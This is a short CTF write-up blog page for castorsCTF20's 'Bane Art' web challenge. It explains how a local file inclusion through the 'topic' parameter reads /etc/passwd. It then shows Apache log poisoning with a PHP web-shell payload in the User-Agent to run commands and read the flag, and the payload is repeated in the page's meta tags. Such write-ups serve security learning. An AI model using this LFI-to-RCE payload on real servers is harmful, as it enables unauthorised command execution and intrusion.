<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Bane Art :: Blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="When we inspect the site we can see it uses topic param for getting the topig. And it looks like it includes the topic file. But can we use it for LFI? YES! We can test it with setting topic to /etc/passwd.
With changing our user agent to &amp;lt;?php system($_GET[&#39;cmd&#39;]);?&amp;gt; and reading /var/log/apache2/access.log file we can execute any command we want using CMD param. Then with setting CMD to ls -Rla we can see flag is inside /home/falg/flag/test/why/the/hassle/right/flag." />
<meta name="keywords" content="blog" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/writups/castorsctf20/bane_art/" />




<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/blue.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="/img/favicon/blue.png">



<meta name="twitter:card" content="summary" />

  <meta name="twitter:site" content="" />

<meta name="twitter:creator" content="tozkoparan (Ahmed Selim Üzüm)" />


<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Bane Art :: Blog">
<meta property="og:description" content="When we inspect the site we can see it uses topic param for getting the topig. And it looks like it includes the topic file. But can we use it for LFI? YES! We can test it with setting topic to /etc/passwd.
With changing our user agent to &amp;lt;?php system($_GET[&#39;cmd&#39;]);?&amp;gt; and reading /var/log/apache2/access.log file we can execute any command we want using CMD param. Then with setting CMD to ls -Rla we can see flag is inside /home/falg/flag/test/why/the/hassle/right/flag." />
<meta property="og:url" content="/writups/castorsctf20/bane_art/" />
<meta property="og:site_name" content="Bane Art" />

  
    <meta property="og:image" content="/img/favicon/blue.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">













</head>
<body class="">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Ahmed Selim Üzüm
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="https://github.com/ahmedselim2017">Github</a></li>
        
      
        
          <li><a href="/writups">CTF Writups</a></li>
        
      
      
    

    
    <div class="spacer"></div>
    <ul class="language-selector">
      <ul class="language-selector-current">
          <li>English ▾</li>
      </ul>
      <ul class="language-selector__more hidden">
        
        <li><a href="/">English</a></li>
        
        <li><a href="/tr/">Türkçe</a></li>
        
      </ul>
    </ul>
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="https://github.com/ahmedselim2017">Github</a></li>
      
    
      
        <li><a href="/writups">CTF Writups</a></li>
      
    
    
    <hr />
        
          <li>
            <a href="/">English</a>
          </li>
        
          <li>
            <a href="/tr/">Türkçe</a>
          </li>
        
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/writups/castorsctf20/bane_art/">Bane Art</a></h1>
  <div class="post-meta">
    
    
    <span class="post-author">::
      tozkoparan (Ahmed Selim Üzüm)
    </span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="/tags/writeup/">writeup</a>&nbsp;
    
    #<a href="/tags/web/">web</a>&nbsp;
    
    #<a href="/tags/castorsctf20/">castorsCTF20</a>&nbsp;
    
  </span>
  

  

  

  <div class="post-content"><div>
        <p>When we inspect the site we can see it uses <code>topic</code> param for getting the topig.
And it looks like it includes the topic file. But can we use it for LFI? YES!
We can test it with setting <code>topic</code> to <code>/etc/passwd</code>.</p>
<p>With changing our user agent to <code>&lt;?php system($_GET['cmd']);?&gt;</code> and reading
<code>/var/log/apache2/access.log</code> file we can execute any command we want using
<code>CMD</code> param. Then with setting <code>CMD</code> to <code>ls -Rla</code> we can see flag is inside
<code>/home/falg/flag/test/why/the/hassle/right/flag.txt</code>. And changing <code>CMD</code> to
<code>cat /home/falg/flag/test/why/the/hassle/right/flag.txt</code> we can get the flag</p>
<p><strong>Flag:</strong> <code>castorsCTF{w3lc0m3_2_D4_s0urc3_YoUng_Ju4n}</code></p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="/writups/castorsctf20/babybof2/">
                <span class="button__icon">←</span>
                <span class="button__text">babybof2</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="/writups/castorsctf20/base_runner/">
                <span class="button__text">Base Number</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>Ahmed Selim Üzüm</span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>





  
</div>

</body>
</html>
